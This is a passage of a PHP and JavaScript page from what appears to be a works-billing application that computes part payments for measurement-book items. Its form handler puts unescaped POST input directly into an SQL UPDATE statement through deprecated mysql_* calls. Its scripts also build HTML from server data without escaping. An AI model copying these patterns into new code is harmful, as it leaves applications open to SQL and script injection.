<?php
//session_start();
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
checkUser();
include "library/common.php";
$msg = '';
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy);
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			//echo key($DpmArrPayPercentList).'<br />';
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
if($_POST['Submit'] == 'Submit')
{
	$RemarkItemItArr = $_POST['txt_rem_item_id'];
	foreach($RemarkItemItArr as $ItemId){
		$ItemRemarks = $_POST['txt_common_remark_'.$ItemId];
		$UpdateRemarkQuery = "update measurementbook_temp set remarks = '$ItemRemarks' where subdivid = '$ItemId' and rbn = '".$_SESSION["rbn"]."' and sheetid = '".$_SESSION["abstsheetid"]."'";
		$UpdateRemarkSql = mysql_query($UpdateRemarkQuery);
	}
	unset($_SESSION["abst_method"]);
	header('Location: AbstMBook_Partpay_nextlevel.php');
}
$staffid = $_SESSION['sid'];
$userid  = $_SESSION['userid'];
$rbn     = $_SESSION["rbn"]; 
$abstsheetid    = $_SESSION["abstsheetid"];   $abstmbno = $_SESSION["abs_mbno"];  $abstmbpage  = $_SESSION["abs_page"];	
$fromdate       = $_SESSION['fromdate'];      $todate   = $_SESSION['todate'];    $abs_mbno_id = $_SESSION["abs_mbno_id"];
$paymentpercent = $_SESSION["paymentpercent"];
//$deletembook_temp_sql = "DELETE FROM measurementbook_temp where sheetid = '$abstsheetid'";
//$deletembook_temp_query = mysql_query($deletembook_temp_sql);
$checkPartpay_sql = "select * from measurementbook_temp where sheetid = '$abstsheetid'";
$checkPartpay_query = mysql_query($checkPartpay_sql);
if(mysql_num_rows($checkPartpay_query)>0)
{
	$check = 1;
}
else
{
	$check = 0;
	$insermbook_temp_sql = "INSERT INTO measurementbook_temp (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill)
SELECT mbgeneratedate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  '100', flag, 0, rbn, active, userid, is_finalbill FROM mbookgenerate where mbookgenerate.sheetid = '$abstsheetid'";
$insermbook_temp_query = mysql_query($insermbook_temp_sql);
}


$query = "SELECT * FROM sheet WHERE sheet_id ='$abstsheetid' ";
//echo $query;
$sqlquery = mysql_query($query);
if ($sqlquery == true) 
{
    $List = mysql_fetch_object($sqlquery);
    $work_name = $List->work_name; 
	$short_name = $List->short_name;   
	$tech_sanction = $List->tech_sanction;  
    $name_contractor = $List->name_contractor;    
	$agree_no = $List->agree_no; 
	$overall_rebate_perc = $List->rebate_percent; 
	$runn_acc_bill_no = $rbn;
	$work_order_no = $List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length = strlen($work_name);
 	$start_line = ceil($length/70);  
	$section_type = $List->section_type;
//    $querys = "SELECT mb_id, sheet_id, mb_date, fromdate, todate, mb_no, mb_page, rbn, active FROM mbookgenerate WHERE active =1
//        AND sheet_id ='$abstsheetid'  AND mb_id in(1,2)";//'$id'";
////echo $querys;
//$sqlquerys = mysql_query($querys);
//$Lists = mysql_fetch_object($sqlquerys);
// $mb_page = $Lists->mb_page;
}
//echo $check;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
<link rel="stylesheet" href="css/button_style.css"></link>
<link rel="stylesheet" href="js/jquery-ui.css">
<script src="js/jquery-1.10.2.js"></script>
<script src="js/jquery-ui.js"></script>
<link rel="stylesheet" href="/resources/demos/style.css">
<link rel="stylesheet" href="Font style/font.css" />
<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
<script type='text/javascript' src='js/basic_model_jquery.js'></script>
<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
<link rel="stylesheet" href="css/font-awesome.css" />
<!--<script type='text/javascript' src='js/basic.js'></script>-->
<script src="dist/sweetalert-dev.js"></script>
<link rel="stylesheet" href="dist/sweetalert.css">
<script type="text/javascript" language="javascript">
	function goBack()
	{
		url = "AbsGenerate_Partpay.php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(remain_percent_dpm != 0){ remain_percent_dpm = remain_percent_dpm.toFixed(2); }
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				//swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				//return false;    updated on 03.11.2016
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			//txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				// Added on 03.02.2017 for 0% payment for SLM item
				var amount = 0;//qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = 0;//Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
				//document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				//document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		var dpmitemQty = document.getElementById("hid_dpm_qty").value;
		if(Number(dpmitemQty) == 0)
		{
			document.getElementById("dpmheadrow1").className 	= "hide";
			document.getElementById("dpmheadrow2").className 	= "hide";
			document.getElementById("dpmtotalrow").className 	= "hide";
			document.getElementById("dpmremarksrow").className 	= "hide";
		}
		else
		{
			document.getElementById("dpmheadrow1").className 	= "";
			document.getElementById("dpmheadrow2").className 	= "";
			document.getElementById("dpmtotalrow").className	= "";
			document.getElementById("dpmremarksrow").className 	= "";
		}
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetails[j+0];
									remarkRbn 		= searchflagdetails[j+1];
									remarkDate 		= searchflagdetails[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayableSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = measurementbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
			document.getElementById("slmheadrow").className = "hide";
			document.getElementById("slmtotalrow").className = "hide";
			document.getElementById("slmremarksrow").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
			document.getElementById("slmheadrow").className = "";
			document.getElementById("slmtotalrow").className = "";
			document.getElementById("slmremarksrow").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm";
							txt_box2.id = "txt_item_rate_slm"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							//txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm";
							txt_box3.id = "txt_partpay_percent_slm"+index;
							txt_box3.value = percent;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm[]";
